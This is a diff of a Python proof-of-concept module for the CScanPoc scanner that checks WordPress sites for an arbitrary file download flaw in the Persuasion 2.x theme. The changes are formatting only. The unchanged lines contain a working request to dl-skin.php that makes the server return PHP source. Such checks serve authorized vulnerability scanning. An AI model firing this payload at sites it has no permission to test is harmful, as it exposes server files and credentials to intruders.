@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0052' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0052'  # 平台漏洞编号，留空
     name = 'WordPress Theme Persuasion 2.x 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2013-12-23'  # 漏洞公布时间
     desc = '''
         The vulnerable file is located at http://vulnerable-site.com/wp-content/themes/persuasion/lib/scripts/dl-skin.php
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress Theme Persuasion 2.x'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '223342bb-c4bb-4904-9795-a8cf863e583d'
@@ -32,13 +34,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/wp-content/themes/persuasion/lib/scripts/dl-skin.php?_mysite_download_skin=dl-skin.php&_mysite_delete_skin_zip='
             verify_url = self.target + payload
             r = requests.get(verify_url)
 
             if r.status_code == 200 and '<?' in r.content and '_mysite_delete_skin_zip' in r.content:
-                #security_hole(verify_url)
+                # security_hole(verify_url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
